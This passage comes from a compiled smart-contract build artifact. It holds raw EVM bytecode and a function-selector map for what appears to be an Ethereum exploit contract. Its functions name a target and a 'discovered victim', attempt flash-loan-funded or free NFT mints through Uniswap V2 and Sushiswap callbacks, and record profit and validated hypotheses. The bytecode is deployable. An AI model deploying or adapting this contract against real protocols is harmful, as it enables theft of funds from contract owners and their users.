3c756cc273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16145b8061348b57508673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614801561348a575073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff16145b5b90508015806134a957505f836dffffffffffffffffffffffffffff16145b806134c357505f826dffffffffffffffffffffffffffff16145b156134d5575f955050505050506134de565b87955050505050505b92915050565b5f5f5f8573ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015613530573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190613554919061443e565b50915091505f8673ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156135a3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906135c79190613e7e565b90505f8773ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015613613573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906136379190613e7e565b90508673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161480156136b3575073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b156136ee576136e386856dffffffffffffffffffffffffffff16856dffffffffffffffffffffffffffff166138fc565b9450505050506137ab565b8673ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16148015613768575073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b156137a35761379886846dffffffffffffffffffffffffffff16866dffffffffffffffffffffffffffff166138fc565b9450505050506137ab565b5f9450505050505b9392505050565b5f5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141580156138775750739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff1663f99031a7836040518263ffffffff1660e01b81526004016138379190613c6d565b602060405180830381865afa158015613852573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906138769190613ed3565b5b9050919050565b5f5f5f90505b838110156138f0578273ffffffffffffffffffffffffffffffffffffffff168582815181106138b6576138b561416a565b5b602002602001015173ffffffffffffffffffffffffffffffffffffffff16036138e35760019150506138f5565b8080600101915050613884565b505f90505b9392505050565b5f5f84148061390a57505f83145b8061391457505f82145b15613921575f905061396f565b5f6103e5856139309190614283565b90505f838261393f9190614283565b90505f826103e8876139519190614283565b61395b9190613f91565b9050808261396991906142f1565b93505050505b9392505050565b5f5ffd5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6139a78261397e565b9050919050565b6139b78161399d565b81146139c1575f5ffd5b50565b5f813590506139d2816139ae565b92915050565b5f819050919050565b6139ea816139d8565b81146139f4575f5ffd5b50565b5f81359050613a05816139e1565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f840112613a2c57613a2b613a0b565b5b8235905067ffffffffffffffff811115613a4957613a48613a0f565b5b602083019150836001820283011115613a6557613a64613a13565b5b9250929050565b5f5f5f5f5f60808688031215613a8557613a84613976565b5b5f613a92888289016139c4565b9550506020613aa3888289016139f7565b9450506040613ab4888289016139f7565b935050606086013567ffffffffffffffff811115613ad557613ad461397a565b5b613ae188828901613a17565b92509250509295509295909350565b5f5f5f5f5f60808688031215613b0957613b08613976565b5b5f613b16888289016139c4565b9550506020613b27888289016139c4565b9450506040613b38888289016139f7565b935050606086013567ffffffffffffffff811115613b5957613b5861397a565b5b613b6588828901613a17565b92509250509295509295909350565b5f7fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b613ba881613b74565b82525050565b5f602082019050613bc15f830184613b9f565b92915050565b5f5f5f5f60808587031215613bdf57613bde613976565b5b5f613bec878288016139f7565b9450506020613bfd878288016139f7565b9350506040613c0e878288016139c4565b9250506060613c1f878288016139c4565b91505092959194509250565b5f8115159050919050565b613c3f81613c2b565b82525050565b5f602082019050613c585f830184613c36565b92915050565b613c678161399d565b82525050565b5f602082019050613c805f830184613c5e565b92915050565b5f819050919050565b5f613ca9613ca4613c9f8461397e565b613c86565b61397e565b9050919050565b5f613cba82613c8f565b9050919050565b5f613ccb82613cb0565b9050919050565b613cdb81613cc1565b82525050565b5f602082019050613cf45f830184613cd2565b92915050565b5f613d0482613cb0565b9050919050565b613d1481613cfa565b82525050565b5f602082019050613d2d5f830184613d0b565b92915050565b613d3c816139d8565b82525050565b5f602082019050613d555f830184613d33565b92915050565b5f613d6582613cb0565b9050919050565b613d7581613d5b565b82525050565b5f602082019050613d8e5f830184613d6c565b92915050565b5f613d9e82613cb0565b9050919050565b613dae81613d94565b82525050565b5f602082019050613dc75f830184613da5565b92915050565b5f613dd782613cb0565b9050919050565b613de781613dcd565b82525050565b5f602082019050613e005f830184613dde565b92915050565b5f5f5f5f60808587031215613e1e57613e1d613976565b5b5f613e2b878288016139c4565b9450506020613e3c878288016139f7565b9350506040613e4d878288016139c4565b9250506060613e5e878288016139c4565b91505092959194509250565b5f81519050613e78816139ae565b92915050565b5f60208284031215613e9357613e92613976565b5b5f613ea084828501613e6a565b91505092915050565b613eb281613c2b565b8114613ebc575f5ffd5b50565b5f81519050613ecd81613ea9565b92915050565b5f60208284031215613ee857613ee7613976565b5b5f613ef584828501613ebf565b91505092915050565b5f81519050613f0c816139e1565b92915050565b5f60208284031215613f2757613f26613976565b5b5f613f3484828501613efe565b91505092915050565b5f604082019050613f505f830185613c5e565b613f5d6020830184613d33565b9392505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f613f9b826139d8565b9150613fa6836139d8565b9250828201905080821115613fbe57613fbd613f64565b5b92915050565b5f608082019050613fd75f830187613c5e565b613fe46020830186613d33565b613ff16040830185613c5e565b613ffe6060830184613c5e565b95945050505050565b5f60808201905061401a5f830187613d33565b6140276020830186613d33565b6140346040830185613c5e565b6140416060830184613c5e565b95945050505050565b5f819050919050565b5f61406d6140686140638461404a565b613c86565b6139d8565b9050919050565b61407d81614053565b82525050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f6140c582614083565b6140cf818561408d565b93506140df81856020860161409d565b6140e8816140ab565b840191505092915050565b5f6080820190506141065f830187614074565b6141136020830186613d33565b6141206040830185613c5e565b818103606083015261413281846140bb565b905095945050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b6141c9816139d8565b82525050565b5f6141da83836141c0565b60208301905092915050565b5f602082019050919050565b5f6141fc82614197565b61420681856141a1565b9350614211836141b1565b805f5b8381101561424157815161422888826141cf565b9750614233836141e6565b925050600181019050614214565b5085935050505092915050565b5f6040820190508181035f83015261426681856141f2565b9050818103602083015261427a81846141f2565b90509392505050565b5f61428d826139d8565b9150614298836139d8565b92508282026142a6816139d8565b915082820484148315176142bd576142bc613f64565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f6142fb826139d8565b9150614306836139d8565b925082614316576143156142c4565b5b828204905092915050565b5f61432b826139d8565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361435d5761435c613f64565b5b600182019050919050565b5f60408201905061437b5f830185613c5e565b6143886020830184613c5e565b9392505050565b5f614399826139d8565b91506143a4836139d8565b92508282039050818111156143bc576143bb613f64565b5b92915050565b5f6dffffffffffffffffffffffffffff82169050919050565b6143e4816143c2565b81146143ee575f5ffd5b50565b5f815190506143ff816143db565b92915050565b5f63ffffffff82169050919050565b61441d81614405565b8114614427575f5ffd5b50565b5f8151905061443881614414565b92915050565b5f5f5f6060848603121561445557614454613976565b5b5f614462868287016143f1565b9350506020614473868287016143f1565b92505060406144848682870161442a565b9150509250925092565b5f6080820190506144a15f830187613d33565b6144ae6020830186614074565b6144bb6040830185613c5e565b81810360608301526144cd81846140bb565b90509594505050505056fea2646970667358221220575f241d282b7b05ee06df9f060427178d1c237d0017300291aa44815dee3af364736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"NFTX_FACTORY()":"4f81cd04","SUSHISWAP_FACTORY()":"495c0f9b","TARGET()":"cc1f2afa","UNISWAP_V2_FACTORY()":"99d8fae3","UNISWAP_V2_USDC_WETH()":"6fcd8b7d","WETH()":"ad5c4648","attemptFlashPublicMint(uint256,uint256,address,address)":"3c3ee3c9","attemptFreeMint(address,uint256,address,address)":"e94a92ca","discoveredVictim()":"72c60172","executeOnOpportunity()":"3c2448ed","hypothesisValidated()":"463defd1","mintedTokenId()":"fabae3eb","onERC721Received(address,address,uint256,bytes)":"150b7a02","profitAmount()":"5ff972cc","profitToken()":"49343624","rollbackObserved()":"c3719bb4","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}